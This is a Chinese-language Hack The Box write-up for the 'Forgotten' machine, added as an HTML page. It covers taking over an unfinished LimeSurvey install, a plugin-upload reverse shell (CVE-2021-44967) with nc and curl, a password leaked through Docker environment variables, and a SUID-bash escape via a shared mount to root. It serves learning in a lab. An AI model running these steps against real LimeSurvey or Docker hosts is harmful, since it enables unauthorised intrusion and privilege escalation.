@@ -1,0 +1,105 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>HTB Forgotten — 完整攻略</title>
+    <link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;500;600&family=Inter:wght@400;500;600;700&family=Noto+Sans+SC:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <style>:root{--bg:#0c0e12;--surface:#13161c;--surface-raised:#1a1e26;--border:#262b36;--text:#c8cdd6;--text-muted:#6b7280;--heading:#e8ecf2;--accent:#4ade80;--accent-dim:#166534;--red:#f87171;--amber:#fbbf24;--blue:#60a5fa;--purple:#c084fc;--cyan:#22d3ee;--code-bg:#0a0c10}*{margin:0;padding:0;box-sizing:border-box}body{font-family:'Noto Sans SC','Inter',-apple-system,sans-serif;background:var(--bg);color:var(--text);line-height:1.7;-webkit-font-smoothing:antialiased}.hero{border-bottom:1px solid var(--border);padding:4rem 2rem 3rem;position:relative}.hero::before{content:'';position:absolute;top:0;left:0;right:0;height:2px;background:linear-gradient(90deg,var(--accent),var(--blue),var(--red))}.hero-inner{max-width:860px;margin:0 auto}.hero-label{font-family:'IBM Plex Mono',monospace;font-size:.75rem;letter-spacing:.12em;text-transform:uppercase;color:var(--accent);margin-bottom:1rem}.hero h1{font-size:2.8rem;font-weight:700;color:var(--heading);letter-spacing:-.03em}.hero h1 span{color:var(--accent)}.hero-meta{margin-top:1.2rem;display:flex;gap:2rem;flex-wrap:wrap;font-family:'IBM Plex Mono',monospace;font-size:.8rem;color:var(--text-muted)}.hero-meta strong{color:var(--text)}.chain{background:var(--surface);border-bottom:1px solid var(--border);padding:1.5rem 2rem;overflow-x:auto}.chain-inner{max-width:860px;margin:0 auto;display:flex;align-items:center;gap:0;white-space:nowrap;font-family:'IBM Plex Mono',monospace;font-size:.78rem}.chain-node{padding:.4rem .9rem;border-radius:4px;font-weight:500}.chain-node.green{background:var(--accent-dim);color:var(--accent)}.chain-node.blue{background:#1e3a5f;color:var(--blue)}.chain-node.red{background:#5f1e1e;color:var(--red)}.chain-arrow{color:var(--text-muted);padding:0 .5rem}.content{max-width:860px;margin:0 auto;padding:3rem 2rem 6rem}.phase{margin-top:3.5rem;margin-bottom:2rem;padding-bottom:.8rem;border-bottom:1px solid var(--border)}.phase:first-child{margin-top:0}.phase-number{font-family:'IBM Plex Mono',monospace;font-size:.7rem;letter-spacing:.15em;text-transform:uppercase;margin-bottom:.3rem}.phase-number.green{color:var(--accent)}.phase-number.blue{color:var(--blue)}.phase-number.red{color:var(--red)}.phase h2{font-size:1.6rem;font-weight:700;color:var(--heading)}h3{font-size:1.15rem;font-weight:600;color:var(--heading);margin-top:2.2rem;margin-bottom:.8rem}p{margin-bottom:1rem}pre{background:var(--code-bg);border:1px solid var(--border);border-radius:6px;padding:1.2rem 1.4rem;overflow-x:auto;margin:1rem 0 1.4rem;font-family:'IBM Plex Mono',monospace;font-size:.82rem;line-height:1.65;color:var(--text)}pre .comment{color:var(--text-muted)}pre .cmd{color:var(--accent)}pre .output{color:#8b949e}pre .highlight{color:var(--amber)}pre .important{color:var(--red)}code{font-family:'IBM Plex Mono',monospace;font-size:.88em;background:var(--surface-raised);padding:.15em .4em;border-radius:3px;color:var(--cyan)}pre code{background:none;padding:0;color:inherit}.callout{border-radius:6px;padding:1rem 1.2rem;margin:1.2rem 0;font-size:.92rem;line-height:1.6}.callout-why{background:#1a1e26;border-left:3px solid var(--blue)}.callout-why .callout-label{color:var(--blue)}.callout-key{background:#1a1220;border-left:3px solid var(--purple)}.callout-key .callout-label{color:var(--purple)}.callout-warn{background:#1e1a12;border-left:3px solid var(--amber)}.callout-warn .callout-label{color:var(--amber)}.callout-label{font-family:'IBM Plex Mono',monospace;font-size:.72rem;font-weight:600;letter-spacing:.1em;text-transform:uppercase;display:block;margin-bottom:.3rem}.takeaway{background:var(--surface);border:1px solid var(--border);border-radius:6px;padding:1.5rem;margin:2rem 0}.takeaway h3{margin-top:0}.takeaway-item{padding:.5rem 0;border-bottom:1px solid var(--border)}.takeaway-item:last-child{border-bottom:none}.takeaway-item strong{color:var(--heading)}.takeaway-item p{margin-bottom:0}.diagram{background:var(--surface);border:1px solid var(--border);border-radius:6px;padding:2rem;margin:1.5rem 0;text-align:center;font-family:'IBM Plex Mono',monospace;font-size:.82rem;line-height:2;color:var(--text);overflow-x:auto}.diagram .node{display:inline-block;padding:.3rem .8rem;border-radius:4px}.diagram .node-green{background:var(--accent-dim);color:var(--accent)}.diagram .node-blue{background:#1e3a5f;color:var(--blue)}.diagram .node-red{background:#5f1e1e;color:var(--red)}.diagram .arrow{color:var(--text-muted);margin:0 .3rem}.footer{text-align:center;padding:2rem;font-family:'IBM Plex Mono',monospace;font-size:.75rem;color:var(--text-muted);border-top:1px solid var(--border);margin-top:4rem}@media(max-width:640px){.hero h1{font-size:1.8rem}.content{padding:2rem 1rem 4rem}pre{font-size:.75rem;padding:1rem}}</style>
+</head>
+<body>
+<div id="gate" style="position:fixed;inset:0;z-index:9999;background:var(--bg);display:flex;align-items:center;justify-content:center;"><div style="text-align:center;font-family:'IBM Plex Mono',monospace;"><div style="font-size:2.4rem;margin-bottom:.3rem;">🫥</div><div style="font-size:.72rem;letter-spacing:.12em;text-transform:uppercase;color:var(--accent);margin-bottom:1.2rem;">HTB Writeup — Restricted</div><div style="color:var(--text-muted);font-size:.85rem;margin-bottom:1.5rem;max-width:320px;line-height:1.6;">This writeup contains spoilers for an HTB machine.<br>Enter the password to continue.</div><input id="gate-pw" type="password" placeholder="Password" autofocus style="background:var(--surface);border:1px solid var(--border);color:var(--heading);padding:.6rem 1rem;border-radius:4px;font-family:inherit;font-size:.9rem;width:220px;text-align:center;outline:none;" onkeydown="if(event.key==='Enter')checkPw()"><br><button onclick="checkPw()" style="margin-top:.8rem;background:var(--accent-dim);color:var(--accent);border:1px solid var(--accent);padding:.5rem 1.8rem;border-radius:4px;font-family:inherit;font-size:.82rem;cursor:pointer;">Enter</button><div id="gate-err" style="color:var(--red);font-size:.78rem;margin-top:.8rem;visibility:hidden;">Incorrect password</div><div style="color:var(--text-muted);font-size:.7rem;margin-top:2rem;opacity:.4;font-style:italic;direction:rtl;unicode-bidi:bidi-override;">Tessera est nomen machinae</div></div></div>
+<script>function checkPw(){if(document.getElementById('gate-pw').value==='forgotten'){document.getElementById('gate').style.display='none';sessionStorage.setItem('htb-auth-fg','1')}else{document.getElementById('gate-err').style.visibility='visible';document.getElementById('gate-pw').value=''}}if(sessionStorage.getItem('htb-auth-fg')==='1')document.getElementById('gate').style.display='none';</script>
+
+<header class="hero"><div class="hero-inner"><div class="hero-label">Hack The Box — 完整攻略</div><h1><span>Forgotten</span></h1><div class="hero-meta"><span>OS <strong>Linux (Docker)</strong></span><span>难度 <strong>Easy</strong></span><span>端口 <strong>22 · 80</strong></span><span>作者 <strong><a href="https://app.hackthebox.com/" style="color:var(--accent);text-decoration:none;">Nauhcnes</a></strong></span></div></div></header>
+
+<div class="chain"><div class="chain-inner"><span class="chain-node green">帮靶机装好 LimeSurvey → 插件上传 RCE</span><span class="chain-arrow">→</span><span class="chain-node blue">Docker env 泄露密码 → SSH 宿主机</span><span class="chain-arrow">→</span><span class="chain-node red">共享目录 SUID bash → root</span></div></div>
+
+<main class="content">
+
+<div class="phase"><div class="phase-number green">Phase 0</div><h2>信息收集</h2></div>
+<pre><code><span class="cmd">$ sudo nmap -sC -sV -p- 10.129.234.81 -T4</span>
+<span class="output">PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu
+80/tcp open  http    Apache httpd 2.4.56 (Debian)
+|_http-title: 403 Forbidden
+Service Info: Host: <span class="highlight">172.17.0.2</span>    ← Docker 容器</span></code></pre>
+<p>gobuster 扫出 <code>/survey/</code>——一个 <strong>LimeSurvey</strong> 安装向导页面（尚未完成安装）。</p>
+
+
+<div class="phase"><div class="phase-number green">Phase 1</div><h2>立足点：帮靶机装好 LimeSurvey → 插件 RCE</h2></div>
+
+<div class="callout callout-key">
+<span class="callout-label">🧒 儿童版 — 餐厅没厨房，你搭一个</span>
+LimeSurvey 就像一家新开的餐厅（网站），需要一个厨房（数据库）才能运营。但这家餐厅自己没有厨房！安装向导允许你填一个"外部厨房地址"。于是你在自己家里搭了个厨房（Docker MySQL），把地址告诉餐厅，餐厅就用你的厨房完成了装修——然后你就拿到了管理员权限。
+</div>
+
+<h3>攻击机搭建 MySQL</h3>
+<pre><code><span class="cmd">$ sudo docker run -d -p 3306:3306 --rm --name tmp-mysql \
+  -e MYSQL_ROOT_PASSWORD=password mysql:latest</span></code></pre>
+
+<p>在安装向导中填写攻击机 IP 作为数据库地址，完成安装并设管理员 <code>admin:password</code>。</p>
+
+<h3>LimeSurvey CVE-2021-44967 插件上传 RCE</h3>
+<pre><code><span class="cmd">$ git clone https://github.com/Y1LD1R1M-1337/Limesurvey-RCE.git</span>
+<span class="comment"># 编辑 config.xml 添加 &lt;version&gt;6.0&lt;/version&gt;</span>
+<span class="comment"># 编辑 php-rev.php 设置攻击机 IP/端口</span>
+<span class="cmd">$ zip Y1LD1R1M.zip config.xml php-rev.php</span>
+
+<span class="comment"># Plugin Manager → Upload & Install</span>
+<span class="cmd">$ nc -lvnp 10001</span>
+<span class="cmd">$ curl http://10.129.234.81/survey/upload/plugins/Y1LD1R1M/php-rev.php</span>
+<span class="output">limesvc@efaa6f5097ed:/$  ← 容器内</span></code></pre>
+
+
+<div class="phase"><div class="phase-number blue">Phase 2</div><h2>横向移动：Docker 环境变量泄露密码</h2></div>
+
+<pre><code><span class="cmd">limesvc@efaa6f5097ed:$ env</span>
+<span class="output"><span class="highlight">LIMESURVEY_PASS=5W5HN4K4GCXf9E</span></span></code></pre>
+
+<div class="callout callout-key">
+<span class="callout-label">🧒 儿童版 — 容器里 env 是必查项</span>
+Docker 容器里的密码经常通过<strong>环境变量</strong>传入（Docker 标准做法）。拿到容器 shell 后第一件事就是运行 <code>env</code>，看看有没有密码、API Key 之类的敏感信息。
+</div>
+
+<pre><code><span class="cmd">$ ssh limesvc@10.129.234.81</span>
+<span class="output">Password: 5W5HN4K4GCXf9E</span>
+<span class="cmd">limesvc@forgotten:~$ cat user.txt</span>
+<span class="output">bfcd5e571f5247a1a8218fa7af135fab</span></code></pre>
+
+
+<div class="phase"><div class="phase-number red">Phase 3</div><h2>权限提升：Docker 共享目录 SUID bash</h2></div>
+
+<pre><code><span class="comment"># 容器内确认共享目录</span>
+<span class="cmd">$ findmnt | grep survey</span>
+<span class="output">/var/www/html/survey  /dev/root[<span class="highlight">/opt/limesurvey</span>]</span></code></pre>
+
+<div class="callout callout-key">
+<span class="callout-label">🧒 儿童版 — 容器里 root 改权限，宿主机上用</span>
+容器和宿主机共享了一个文件夹。在容器里我们有 sudo 权限（可以变 root），宿主机上没有。在容器里用 root 权限复制一个 bash 并设置 SUID 权限，它会出现在宿主机的共享目录里——而且 SUID 权限保留着！
+</div>
+
+<pre><code><span class="comment"># 容器内（sudo su 变成 root）</span>
+<span class="cmd"># cd /var/www/html/survey</span>
+<span class="cmd"># cp /bin/bash .</span>
+<span class="cmd"># chmod +s bash</span>
+
+<span class="comment"># 宿主机上</span>
+<span class="cmd">limesvc@forgotten:/opt/limesurvey$ ./bash -p</span>
+<span class="cmd">bash-5.1# cat /root/root.txt</span>
+<span class="output">bf3ea819836ecb51b9e03d6adce1f760</span></code></pre>
+
+
+<div class="phase"><div class="phase-number" style="color:var(--purple);">附录</div><h2>知识点总结</h2></div>
+
+<div class="takeaway">
+<div class="takeaway-item"><strong>半成品应用是攻击面。</strong><p>安装向导没有认证保护，你可以帮它"装好"并自己设管理员密码。连外部数据库也行。</p></div>
+<div class="takeaway-item"><strong>Docker 容器枚举优先级。</strong><p>拿到容器 shell 后立刻检查 <code>env</code>（环境变量）、<code>hostname</code>、<code>/proc/1/cgroup</code>、<code>findmnt</code>（挂载点）。</p></div>
+<div class="takeaway-item"><strong>共享目录 SUID 逃逸。</strong><p>容器内用 root 创建 SUID bash → 宿主机执行 <code>./bash -p</code> → root。关键前提：容器内必须先变成 root。</p></div>
+</div>
+
+<div class="diagram"><span class="node node-green">帮装 LimeSurvey → 插件 RCE</span><span class="arrow">→</span><span class="node node-blue">env 泄露密码 → SSH</span><span class="arrow">→</span><span class="node node-red">共享目录 SUID bash → root</span></div>
+
+</main>
+<footer class="footer"><a href="https://app.hackthebox.com/" style="color:var(--accent);text-decoration:none;">Nauhcnes</a> · HTB Forgotten Writeup · 2026</footer>
+</body></html>
